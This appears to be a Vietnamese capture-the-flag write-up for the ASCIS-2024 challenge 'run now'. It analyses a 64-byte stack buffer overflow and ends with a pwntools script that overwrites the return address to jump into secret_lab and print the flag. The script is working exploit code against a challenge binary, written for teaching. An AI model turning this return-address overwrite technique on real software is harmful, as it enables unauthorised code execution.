# [ASCIS-2024] run now
<p>Chương trình cho một menu gồm 4 lựa chọn. Trong lựa chọn số 1, đọc tối đa 127 byte vào s. Biến s có kích thước 127 byte nên chưa có buffer overflow ở đoạn này. Sau đó, truyền tham số s vào hàm quantum_entangle.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post9/image.png)

<p>Trong hàm quantum_entangle, copy nội dung a1 vào dest. Vì dest chỉ chứa 64 byte < 128 byte -> Buffer overflow -> Cần đệm 72 byte (64 của dest + 8 của rbp) để tới RIP.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post9/image-1.png)

<p>Ngoài ra còn có hàm secret_lab để đọc nội dung flag -> Mục tiêu: kiểm soát giá trị RIP trên stack để trỏ về hàm secret_lab. Ở đây, ta có thể đi tới thẳng tới địa chỉ chuẩn bị thực thi hàm system để bỏ qua việc nhập password.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post9/image-2.png)

<p>Bắt đầu từ địa chỉ main+120, lệnh "cat flag.txt" bắt được lấy ra và đưa vào thanh ghi rdi để set tham số cho hàm system.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post9/image-3.png)

<p>Script exploit:</p>

```
from pwn import *

p = process('./chall')
elf = ELF('./chall')

secret_lab = p64(elf.symbols['secret_lab'] + 120)

payload = b'a' * 72
payload += secret_lab

p.sendlineafter(b'Enter your choice: ', b'1')
p.sendlineafter(b'Enter quantum coordinates: ', payload)

p.interactive()
```

<p>Chạy script và lấy được flag thành công.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post9/image-4.png)


